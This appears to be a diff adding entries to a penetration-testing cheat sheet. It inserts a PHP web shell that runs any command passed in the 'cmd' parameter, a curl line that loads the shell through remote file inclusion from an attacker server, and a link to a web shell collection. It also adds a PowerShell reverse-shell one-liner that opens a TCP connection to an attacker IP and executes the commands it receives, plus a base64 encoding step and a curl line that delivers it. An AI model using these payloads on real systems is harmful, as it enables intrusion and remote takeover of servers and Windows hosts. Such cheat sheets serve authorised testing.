@@ -3627,6 +3627,28 @@ urlencode("SHELL")
 ?>
 ```
 
+```c
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+Usage: curl "http://IP/index.php?page=http://LOCAL_IP_SERVER/backdoor.php&cmd=COMMAND"
+```
+
+##### RFI
+
+All the WebShells
+
+https://github.com/xl7dev/WebShell 
+
 ###### IPV6
 
 ```c
@@ -5987,6 +6009,8 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
 
 ###### revshell_encoder.py
 
+powershell revshell one-liner
+
 ```c
 import sys
 import base64
@@ -5996,6 +6020,18 @@ payload = '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);
 cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 print(cmd)
+```
+
+In the commandline
+
+```c
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+
+Usage:
+curl http://IP/backdoor.pHP?cmd=powershell%20-enc%20<$EncodedText>
 ```
 
 ###### Payload Encoding
